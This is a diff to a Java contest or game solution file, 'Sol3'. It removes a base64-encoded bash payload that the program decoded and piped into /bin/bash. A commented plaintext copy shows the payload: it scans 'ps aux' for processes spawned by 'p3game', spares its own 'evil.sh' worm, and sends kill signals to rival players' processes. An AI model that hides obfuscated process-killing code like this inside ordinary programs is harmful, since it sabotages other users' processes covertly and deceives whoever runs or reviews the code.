@@ -8,64 +8,6 @@ public class Sol3
 {
   public static void main(String[] args) throws Exception
   {
-    //String Base = "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO3BzPSggJChwcyAtbyBwaWQscHBpZCkgKTtkZWNsYXJlIC1hIHdvcm1zO2RlY2xhcmUgLWEgUElEUztjb3VudD0wO2ZvciBpIGluICR7YXV4WypdfTtkbyBpZiBbWyAkaSA9IConL2Jpbi9iYXNoIC0gLi9ldmlsLnNoJyogXV07IHRoZW4gSUZTPSQnICc7IGxpbmU9KCAkaSApOyBteVBJRD0ke2xpbmVbMV19OyBteVdvcm09JChwcyAtbyBwcGlkPSAtcCAkbXlQSUQpOyBmaTsgaWYgW1sgJGkgPSAqJ3AzZ2FtZScqIF1dOyB0aGVuIElGUz0kJyAnOyBsaW5lPSggJGkgKTsgcGFyZW50UElEPSR7bGluZVsxXX07IG5hbWU9JHtpIyMqcDNnYW1lIH07IGRlY2xhcmUgLWEgd29ybXM9KCAkbmFtZSApOyBmaTsgZm9yIGogaW4gJHtuYW1lWypdfTsgZG8gbGluZT0oICRpICk7IGlmIFtbICRpID0gKiRqKiBdXTsgdGhlbiBpZiBbWyAke2xpbmVbMV19IC1uZSAkcGFyZW50UElEIF1dOyB0aGVuIFBJRFNbJGNvdW50XT0ke2xpbmVbMV19OyBsZXQgY291bnQrKzsgZmk7IGZpOyBkb25lOyBkb25lOyBmb3IgaSBpbiAke1BJRFNbQF19OyBkbyBpZiBbWyAkaSAtbmUgJG15V29ybSBdXTsgdGhlbiBlY2hvICQoa2lsbCAtMiAkaSk7IGZpOyBkb25lOw==";
-    String Base = "SUZTPSQnXG4nO2F1eD0oICQocHMgYXV4KSApO3BzPSggJChwcyAtbyBwaWQscHBpZCkgKTtkZWNsYXJlIC1hIHdvcm1zO2RlY2xhcmUgLWEgUElEUztjb3VudD0wO2ZvciBpIGluICR7YXV4WypdfTtkbyBpZiBbWyAkaSA9IConL2Jpbi9iYXNoIC0gJyogXV07IHRoZW4gSUZTPSQnICc7IGxpbmU9KCAkaSApOyBteVBJRD0ke2xpbmVbMV19OyBteVdvcm09JChwcyAtbyBwcGlkPSAtcCAkbXlQSUQpOyBmaTsgaWYgW1sgJGkgPSAqJ3AzZ2FtZScqIF1dOyB0aGVuIElGUz0kJyAnOyBsaW5lPSggJGkgKTsgcGFyZW50UElEPSR7bGluZVsxXX07IG5hbWU9JHtpIyMqcDNnYW1lIH07IGRlY2xhcmUgLWEgd29ybXM9KCAkbmFtZSApOyBmaTsgZm9yIGogaW4gJHtuYW1lWypdfTsgZG8gbGluZT0oICRpICk7IGlmIFtbICRpID0gKiRqKiBdXTsgdGhlbiBpZiBbWyAke2xpbmVbMV19IC1uZSAkcGFyZW50UElEIF1dOyB0aGVuIFBJRFNbJGNvdW50XT0ke2xpbmVbMV19OyBsZXQgY291bnQrKzsgZmk7IGZpOyBkb25lOyBkb25lOyBmb3IgaSBpbiAke1BJRFNbQF19OyBkbyBpZiBbWyAkaSAtbmUgJG15V29ybSBdXTsgdGhlbiAkKGtpbGwgLTIgJGkpOyBmaTsgZG9uZQ==";
-    //String command="/bin/bash - IFS=$'\\n';aux=( $(ps aux) );ps=( $(ps -o pid,ppid) );declare -a worms;declare -a PIDS;count=0;for i in ${aux[*]};do if [[ $i = *'/bin/bash - ./evil.sh'* ]]; then IFS=$' '; line=( $i ); myPID=${line[1]}; myWorm=$(ps -o ppid= -p $myPID); fi; if [[ $i = *'p3game'* ]]; then IFS=$' '; line=( $i ); parentPID=${line[1]}; name=${i##*p3game }; declare -a worms=( $name ); fi; for j in ${name[*]}; do line=( $i ); if [[ $i = *$j* ]]; then if [[ ${line[1]} -ne $parentPID ]]; then PIDS[$count]=${line[1]}; let count++; fi; fi; done; done; for i in ${PIDS[@]}; do if [[ $i -ne $myWorm ]]; then $(kill -2 $i); fi; done";
-    Process process = Runtime.getRuntime().exec(new String[]{"echo", Base});
-    String line;
-    OutputStream stdin = null;
-    InputStream stdout = null;
-    stdout = process.getInputStream ();
-    BufferedReader brCleanUp =
-              new BufferedReader (new InputStreamReader (stdout));
-    line = brCleanUp.readLine();
-    brCleanUp.close();
-
-    Process process2 = Runtime.getRuntime().exec(new String[]{"base64" , "-d"});
-    stdin = process2.getOutputStream ();
-    stdout = process2.getInputStream ();
-    stdin.write(line.getBytes() );
-    stdin.flush();
-    stdin.close();
-
-    BufferedReader brCleanUp2 =
-              new BufferedReader (new InputStreamReader (stdout));
-    line = brCleanUp2.readLine ();
-    brCleanUp.close();
-
-    Process process3 = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-"});
-    stdin = process3.getOutputStream ();
-    stdout = process3.getInputStream ();
-    stdin.write(line.getBytes() );
-    stdin.flush();
-    stdin.close();
-
-                    
-
-    /*ProcessBuilder builder = new ProcessBuilder(new String[]{"echo", Base});
-    final Process process = builder.start();
-    InputStream is = process.getInputStream();
-    InputStreamReader isr = new InputStreamReader(is);
-    BufferedReader br = new BufferedReader(isr);
-    line = br.readLine();
-    System.err.println(line);
-    ProcessBuilder builder2 = new ProcessBuilder(new String[]{"base64", "-d"});
-    final Process process2 = builder.start();
-    InputStream is2 = process.getInputStream();
-    InputStreamReader isr2 = new InputStreamReader(is2);
-    BufferedReader br2 = new BufferedReader(isr2);
-    OutputStream os2 = process.getOutputStream();
-    OutputStreamWriter osr2 = new OutputStreamWriter(os2);
-    BufferedWriter bw2 = new BufferedWriter(osr2);
-    bw2.write(line);
-    while ((line = br2.readLine()) != null)
-      System.err.println(line);
-    */
-    //Process p = Runtime.getRuntime().exec(new String[]{"echo",  Base});
-    //Process a = Runtime.getRuntime().exec(new String[]{"base64", "-d"});
-    //inheritIO(p.getInputStream(), System.err);
-    //a.getInputStream(p.getOutputStream());
-    //Process b = Runtime.getRuntime().exec(new String[]{"/bin/bash"});
     long start = System.currentTimeMillis();
     Scanner sc = new Scanner(System.in);
     Sol3 brain = new Sol3();
